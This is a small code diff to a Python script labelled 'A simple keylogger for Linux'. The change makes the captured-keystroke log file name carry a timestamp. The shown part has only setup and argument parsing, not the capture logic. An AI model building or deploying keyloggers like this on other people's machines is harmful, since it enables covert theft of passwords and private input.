@@ -1,15 +1,17 @@
 #!/usr/bin/env python
 import os
 from argparse import ArgumentParser
+from datetime import datetime
 
 from keylogger import pyxhook
 
 
 def main():
+    ts = datetime.now().strftime("%d-%m-%Y_%H:%M:%S")
     parser = ArgumentParser(description='A simple keylogger for Linux.')
     parser.add_argument(
             '--log-file',
-            default=os.path.join(os.getcwd(), 'output.log'),
+            default=os.path.join(os.getcwd(), 'keys-' + str(ts) + '.log'),
             help='Save the output in this file.',
             )
     parser.add_argument(
